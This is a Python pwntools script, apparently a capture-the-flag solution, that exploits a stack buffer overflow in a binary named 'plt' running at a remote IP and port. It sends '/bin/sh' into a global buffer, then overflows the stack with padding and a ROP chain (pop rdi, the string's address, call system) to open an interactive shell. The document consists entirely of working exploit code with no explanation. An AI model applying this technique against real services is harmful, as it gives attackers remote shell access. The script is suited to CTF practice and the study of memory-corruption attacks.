#!/usr/bin/env python                                                                                                 2 # coding=utf-8
from pwn import *
ip   = '140.110.112.31'
prot = 2020
r = remote(ip, prot)
#r = process("./plt")
pop_rdi_ret = 0x400773
bin_sh_addr = 0x601070
call_system = 0x4006bf

print(r.recvuntil("What your name?"))
r.sendline('/bin/sh\x00')
print(r.recvuntil("What do you want to say :)?"))
payload = b"A" * 48 + b"B" * 8
payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(call_system)
r.sendline(payload)
r.interactive() 